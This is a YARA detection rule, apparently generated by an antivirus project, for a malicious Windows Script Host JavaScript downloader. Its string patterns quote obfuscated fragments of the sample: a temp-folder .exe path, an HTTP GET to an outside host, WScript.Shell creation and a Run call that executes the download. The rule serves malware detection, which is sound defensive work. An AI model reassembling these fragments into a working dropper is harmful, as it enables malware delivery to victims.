rule sig_20160328_34503ef99821229fd0524dd177c8ff5f {
  meta:
    description = "datamaliciousorder - file 20160328_34503ef99821229fd0524dd177c8ff5f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ac0a9692475b4b57df3850f6b734e9d45d997368eef2d794103afa196a520332"

  strings:
    $s1  = "function Gwsynwezlz() {return Ljlmb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vCTlXN0bBLNE4lH.exe\";};" fullword ascii
    $s2  = "Irhbdu[Qbdld](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Uonqfrvll](Nwadzf() * 11)} while (Irhbdu[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ljlmb = function Fgnirzllxp() {return WScript[Piavrxyfuu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qvofbykb(Fsrldj, Nleut){return Fsrldj - Nleut;};" fullword ascii
    $s6  = "function Qcjrelnvqr(Tfvov){Ljlmb[\"Run\"](Tfvov, Orisaelr, Orisaelr);};" fullword ascii
    $s7  = "function Cvyvj() {return ((Titwrx == true) && (Titwrx == Cdaoc)) ? 1 : Orisaelr;};" fullword ascii
    $s8  = "var Cdaoc = false;" fullword ascii
    $s9  = "return Qvofbykb(Kehovu, Gmvqkwpfv);" fullword ascii
    $s10 = "Titwrx = true; " fullword ascii
    $s11 = " while (Mmughgaa){" fullword ascii
    $s12 = "function Nwadzf(){return 22;};" fullword ascii
    $s13 = "function Vfzlxtf(){return Qiqwjpe;};" fullword ascii
    $s14 = "function Waxposdpcc(){return Piavrxyfuu;};" fullword ascii
    $s15 = "var Rfzrzcfx = false;" fullword ascii
    $s16 = "var Titwrx = false;" fullword ascii
    $s17 = "var Qvltgtliv = new this[\"Date\"]();" fullword ascii
    $s18 = "Cdaoc = true; " fullword ascii
    $s19 = "function Irkiwc()" fullword ascii
    $s20 = "} catch(Lmyzspmjxd){Mmughgaa = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}